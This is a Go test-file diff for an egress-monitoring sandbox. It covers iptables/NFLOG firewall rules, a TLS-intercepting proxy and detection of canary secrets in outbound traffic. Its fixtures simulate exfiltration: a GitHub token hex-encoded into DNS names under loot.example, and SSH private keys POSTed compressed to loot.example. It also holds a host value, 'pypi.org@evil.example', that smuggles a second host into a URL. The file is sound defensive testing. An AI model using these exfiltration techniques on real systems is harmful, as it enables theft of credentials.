@@ -2,10 +2,15 @@ package egress
 
 import (
 	"bytes"
+	"compress/flate"
+	"compress/gzip"
+	"compress/zlib"
 	"context"
 	"crypto/tls"
 	"crypto/x509"
 	"encoding/base64"
+	"encoding/binary"
+	"encoding/hex"
 	"encoding/json"
 	"encoding/pem"
 	"errors"
@@ -371,8 +376,9 @@ func TestAllowedHostsPassThroughOthersGetAFake200AndBothAreSearchedForCanaries(t
 		t.Fatalf("connect observations = %+v, want both tunnels", tunnels)
 	}
 	for _, c := range tunnels {
-		if d, ok := c.(ConnectDetail); !ok || d.Via != "proxy" || !d.Intercepted || d.Port != 443 {
-			t.Errorf("tunnel %+v, want intercepted through the proxy on 443", d)
+		d, ok := c.(ConnectDetail)
+		if !ok || d.Via != "proxy" || !d.Intercepted || d.Port != 443 || d.Allowed != (d.Host == "api.weather.example") {
+			t.Errorf("tunnel %+v, want intercepted through the proxy on 443, allowed only for the allowed host", d)
 		}
 	}
 }
@@ -410,7 +416,7 @@ func TestAClientThatRefusesTheCAIsRecordedAsNotIntercepted(t *testing.T) {
 }
 
 func TestFirewallHoldsTheAccountToTheHarnessPorts(t *testing.T) {
-	fw := Firewall{Chain: "MCP_CUSTOMS", UID: 1000, ProxyPort: 3128, DNSPort: 5353, CatchPort: 4444}
+	fw := Firewall{Chain: "MCP_CUSTOMS", UID: 1000, ProxyPort: 3128, DNSPort: 5353, CatchPort: 4444, NFLogGroup: 47}
 	rules := make([]string, 0, len(fw.Rules()))
 	for _, c := range fw.Rules() {
 		rules = append(rules, strings.Join(c, " "))
@@ -420,13 +426,22 @@ func TestFirewallHoldsTheAccountToTheHarnessPorts(t *testing.T) {
 		"iptables -w -t nat -A MCP_CUSTOMS -p tcp -d 127.0.0.1 --dport 3128 -j RETURN",
 		"iptables -w -t nat -A MCP_CUSTOMS -p tcp -j REDIRECT --to-ports 4444",
 		"iptables -w -t nat -I OUTPUT -m owner --uid-owner 1000 -j MCP_CUSTOMS",
+		"iptables -w -t filter -A MCP_CUSTOMS -j NFLOG --nflog-group 47",
 		"iptables -w -t filter -A MCP_CUSTOMS -j REJECT",
 		"iptables -w -t filter -I OUTPUT -m owner --uid-owner 1000 -j MCP_CUSTOMS",
+		"ip6tables -w -t filter -A MCP_CUSTOMS -j NFLOG --nflog-group 47",
 		"ip6tables -w -t filter -A MCP_CUSTOMS -j REJECT",
 		"ip6tables -w -t filter -I OUTPUT -m owner --uid-owner 1000 -j MCP_CUSTOMS",
 	} {
 		if !slices.Contains(rules, want) {
 			t.Errorf("the firewall lacks %q", want)
+		}
+	}
+	for _, table := range []string{"iptables -w -t filter", "ip6tables -w -t filter"} {
+		logged := slices.Index(rules, table+" -A MCP_CUSTOMS -j NFLOG --nflog-group 47")
+		rejected := slices.Index(rules, table+" -A MCP_CUSTOMS -j REJECT")
+		if logged < 0 || logged+1 != rejected {
+			t.Errorf("%s: NFLOG at %d, REJECT at %d; every refused packet must be logged just before it is rejected", table, logged, rejected)
 		}
 	}
 	if last := rules[len(rules)-1]; !strings.Contains(last, "-j MCP_CUSTOMS") {
@@ -435,7 +450,7 @@ func TestFirewallHoldsTheAccountToTheHarnessPorts(t *testing.T) {
 }
 
 func TestFirewallUpTakesItselfDownWhenARuleFails(t *testing.T) {
-	fw := Firewall{Chain: "MCP_CUSTOMS", UID: 1000, ProxyPort: 3128, DNSPort: 5353, CatchPort: 4444}
+	fw := Firewall{Chain: "MCP_CUSTOMS", UID: 1000, ProxyPort: 3128, DNSPort: 5353, CatchPort: 4444, NFLogGroup: 47}
 	var ran []string
 	run := func(_ context.Context, c Command) error {
 		ran = append(ran, strings.Join(c, " "))
@@ -450,8 +465,11 @@ func TestFirewallUpTakesItselfDownWhenARuleFails(t *testing.T) {
 	if !slices.Contains(ran, "iptables -w -t nat -D OUTPUT -m owner --uid-owner 1000 -j MCP_CUSTOMS") {
 		t.Errorf("after a failed rule, ran %v; want the firewall taken down", ran)
 	}
-	if err := (Firewall{Chain: "X", ProxyPort: 1, DNSPort: 1, CatchPort: 1}).Up(t.Context(), run); err == nil {
+	if err := (Firewall{Chain: "X", ProxyPort: 1, DNSPort: 1, CatchPort: 1, NFLogGroup: 1}).Up(t.Context(), run); err == nil {
 		t.Error("a firewall for uid 0 was put up; root's traffic is the harness's own")
+	}
+	if err := (Firewall{Chain: "X", UID: 1000, ProxyPort: 1, DNSPort: 1, CatchPort: 1}).Up(t.Context(), run); err == nil {
+		t.Error("a firewall with no NFLOG group was put up; what it refuses would go unrecorded")
 	}
 }
 
@@ -466,4 +484,208 @@ func jsonEqual(t *testing.T, got, want any) bool {
 		t.Fatal(err)
 	}
 	return bytes.Equal(a, b)
+}
+
+func TestDNSNamesAreSearchedForCanaries(t *testing.T) {
+	token := testCanaries.Get(canary.GitHubToken)
+	h := hex.EncodeToString([]byte(token))
+	// A hex label is at most 63 characters, so the key is spread over two.
+	name := h[:40] + "." + h[40:] + ".loot.example"
+	rec := newRecorded()
+	e := New(Config{Resolver: fakeResolver{}})
+	e.Observe(rec.observe)
+	e.SetCanaries(testCanaries)
+	if _, ok := e.answerDNS(dnsQuery(t, name, dnsmessage.TypeA)); !ok {
+		t.Fatal("no reply")
+	}
+	obs := rec.of(KindDNS)
+	if len(obs) != 1 {
+		t.Fatalf("dns observations = %+v", obs)
+	}
+	d, _ := obs[0].(DNSDetail)
+	if !slices.Contains(d.Canaries, findings.Match{Canary: canary.GitHubToken, Encoding: findings.Hex}) {
+		t.Errorf("canaries in %s = %+v, want the token, hex", name, d.Canaries)
+	}
+}
+
+// post sends body through the proxy to target with headers, and answers what
+// the proxy recorded of it.
+func post(t *testing.T, e *Egress, ca *CA, target string, body []byte, header http.Header) HTTPDetail {
+	t.Helper()
+	rec := newRecorded()
+	e.Observe(rec.observe)
+	proxy := httptest.NewServer(e.Proxy())
+	t.Cleanup(proxy.Close)
+	req, err := http.NewRequestWithContext(t.Context(), http.MethodPost, target, bytes.NewReader(body))
+	if err != nil {
+		t.Fatal(err)
+	}
+	for k, v := range header {
+		req.Header[k] = v
+	}
+	resp, err := proxyClient(proxy.URL, ca).Do(req)
+	if err != nil {
+		t.Fatal(err)
+	}
+	_, _ = io.Copy(io.Discard, resp.Body)
+	_ = resp.Body.Close()
+	obs := rec.of(KindHTTP)
+	if len(obs) != 1 {
+		t.Fatalf("http observations = %+v", obs)
+	}
+	d, _ := obs[0].(HTTPDetail)
+	return d
+}
+
+func TestCompressedBodiesAreSearchedDecoded(t *testing.T) {
+	key := testCanaries.Get(canary.SSHPrivateKey)
+	var gz, zl, raw bytes.Buffer
+	for _, w := range []io.WriteCloser{gzip.NewWriter(&gz), zlib.NewWriter(&zl)} {
+		_, _ = io.WriteString(w, "key="+key)
+		_ = w.Close()
+	}
+	fw, _ := flate.NewWriter(&raw, flate.BestSpeed)
+	_, _ = io.WriteString(fw, "key="+key)
+	_ = fw.Close()
+	for name, tc := range map[string]struct {
+		encoding string
+		body     []byte
+	}{
+		"gzip":         {"gzip", gz.Bytes()},
+		"zlib deflate": {"deflate", zl.Bytes()},
+		"raw deflate":  {"deflate", raw.Bytes()},
+	} {
+		t.Run(name, func(t *testing.T) {
+			ca := newCA(t)
+			e := New(Config{CA: ca, Upstream: &fakeUpstream{}})
+			e.SetCanaries(testCanaries)
+			d := post(t, e, ca, "https://loot.example/", tc.body, http.Header{"Content-Encoding": {tc.encoding}})
+			if !slices.Contains(d.Canaries, findings.Match{Canary: canary.SSHPrivateKey, Encoding: findings.Plain}) || d.Unscanned != "" {
+				t.Errorf("a %s body: canaries %+v, unscanned %q; want the key found and the body searched whole", name, d.Canaries, d.Unscanned)
+			}
+		})
+	}
+}
+
+func TestBodiesThatCantBeSearchedWholeSaySo(t *testing.T) {
+	key := testCanaries.Get(canary.GitHubToken)
+	for name, tc := range map[string]struct {
+		body     []byte
+		encoding string
+		want     string
+	}{
+		"a key after 8 MiB of padding": {append(bytes.Repeat([]byte{' '}, maxScan), key...), "", "over 8 MiB"},
+		"brotli":                       {[]byte("\x1b\x00"), "br", `encoding "br"`},
+		"gzip that isn't":              {[]byte("not gzip"), "gzip", "could not be decoded"},
+	} {
+		t.Run(name, func(t *testing.T) {
+			ca := newCA(t)
+			e := New(Config{CA: ca, Upstream: &fakeUpstream{}})
+			e.SetCanaries(testCanaries)
+			header := http.Header{}
+			if tc.encoding != "" {
+				header.Set("Content-Encoding", tc.encoding)
+			}
+			if d := post(t, e, ca, "https://loot.example/", tc.body, header); !strings.Contains(d.Unscanned, tc.want) {
+				t.Errorf("unscanned = %q, want it to say %q", d.Unscanned, tc.want)
+			}
+		})
+	}
+}
+
+func TestTheRegistriesAreAllowedOnlyWhileAnInstallRuns(t *testing.T) {
+	e := New(Config{Allow: []string{"api.weather.example"}, InstallAllow: RegistryHosts})
+	if e.isAllowed("registry.npmjs.org") {
+		t.Error("a registry is allowed before the install")
+	}
+	e.Installing(true)
+	if !e.isAllowed("registry.npmjs.org") || !e.isAllowed("api.weather.example") {
+		t.Error("during the install, the registries and the run's hosts must be allowed")
+	}
+	e.Installing(false)
+	if e.isAllowed("proxy.golang.org") || !e.isAllowed("api.weather.example") {
+		t.Error("after the install, the registries must not be allowed; the run's hosts still are")
+	}
+}
+
+func TestUpstreamURLsAreBuiltFromTheCheckedHostOnly(t *testing.T) {
+	u, _ := url.Parse("/simple/x/?a=1")
+	for name, tc := range map[string]struct {
+		host string
+		port int
+		want string
+		ok   bool
+	}{
+		"a host and port":  {"pypi.org", 443, "https://pypi.org:443/simple/x/?a=1", true},
+		"a host":           {"pypi.org", 0, "https://pypi.org/simple/x/?a=1", true},
+		"userinfo":         {"pypi.org@evil.example", 443, "", false},
+		"a path in a host": {"pypi.org/evil", 0, "", false},
+		"brackets":         {"pypi.org]", 0, "", false},
+	} {
+		got, err := upstreamURL("https", tc.host, tc.port, u)
+		if (err == nil) != tc.ok || got != tc.want {
+			t.Errorf("%s: upstreamURL = %q, %v; want %q, ok %v", name, got, err, tc.want, tc.ok)
+		}
+	}
+}
+
+func TestRefusedPacketsAreReadForWhereTheyWereHeaded(t *testing.T) {
+	udp4 := []byte{
+		0x45, 0, 0, 0, 0, 0, 0, 0, 64, protoUDP, 0, 0, 192, 0, 2, 2, 203, 0, 113, 9,
+		0x30, 0x39, 0x27, 0x0f, 0, 13, 0, 0, 'k', '=', 's', 'e', 'c',
+	}
+	tcp6 := make([]byte, 60)
+	tcp6[0], tcp6[6] = 0x60, protoTCP
+	copy(tcp6[24:40], netip.MustParseAddr("2001:db8::7").AsSlice())
+	tcp6[42], tcp6[43], tcp6[52] = 0x01, 0xbb, 5<<4
+	icmp4 := []byte{0x45, 0, 0, 0, 0, 0, 0, 0, 64, protoICMP, 0, 0, 192, 0, 2, 2, 198, 51, 100, 1, 8, 0, 0, 0}
+	for name, tc := range map[string]struct {
+		packet  []byte
+		want    ConnectDetail
+		payload string
+	}{
+		"UDP over IPv4": {udp4, ConnectDetail{Address: "203.0.113.9", Port: 9999, Proto: "udp", Via: "direct", Refused: true}, "k=sec"},
+		"TCP over IPv6": {tcp6, ConnectDetail{Address: "2001:db8::7", Port: 443, Proto: "tcp", Via: "direct", Refused: true}, ""},
+		"ICMP":          {icmp4, ConnectDetail{Address: "198.51.100.1", Proto: "icmp", Via: "direct", Refused: true}, string(icmp4[20:])},
+	} {
+		got, payload, ok := refusedPacket(tc.packet)
+		if !ok || !jsonEqual(t, got, tc.want) || string(payload) != tc.payload {
+			t.Errorf("%s: %+v %q %v, want %+v %q", name, got, payload, ok, tc.want, tc.payload)
+		}
+	}
+	if _, _, ok := refusedPacket([]byte{0x45, 0}); ok {
+		t.Error("a cut packet was read")
+	}
+}
+
+func TestNetlinkMessagesAndAttributesAreSplit(t *testing.T) {
+	attrs := append(nla(1, []byte{7}), nla(nfulaPayload, []byte("packet"))...)
+	body := append(make([]byte, nfgenmsgLen), attrs...)
+	msg := make([]byte, nlmsgHeaderLen, nlmsgHeaderLen+len(body))
+	msg = append(msg, body...)
+	binary.NativeEndian.PutUint32(msg, uint32(len(msg))) //nolint:gosec // a test message of a few dozen bytes
+	binary.NativeEndian.PutUint16(msg[4:], nfnlSubsysULOG<<8|nfulnlMsgPacket)
+	msgs := messages(append(msg, msg...))
+	if len(msgs) != 2 || msgs[0].kind != nfnlSubsysULOG<<8|nfulnlMsgPacket {
+		t.Fatalf("messages = %+v", msgs)
+	}
+	if got := attribute(msgs[1].body[nfgenmsgLen:], nfulaPayload); string(got) != "packet" {
+		t.Errorf("payload = %q", got)
+	}
+}
+
+func TestDirectTrafficRecordsStopAtTheirBound(t *testing.T) {
+	rec := newRecorded()
+	e := New(Config{})
+	e.Observe(rec.observe)
+	for range maxDirect + 5 {
+		e.recordDirect(ConnectDetail{Address: "203.0.113.9", Port: 9, Proto: "udp", Via: "direct", Refused: true})
+	}
+	obs := rec.of(KindConnect)
+	if len(obs) != maxDirect {
+		t.Fatalf("%d direct observations, want %d", len(obs), maxDirect)
+	}
+	if last, _ := obs[maxDirect-1].(ConnectDetail); !last.More {
+		t.Error("the last recorded must say more were refused unrecorded")
+	}
 }
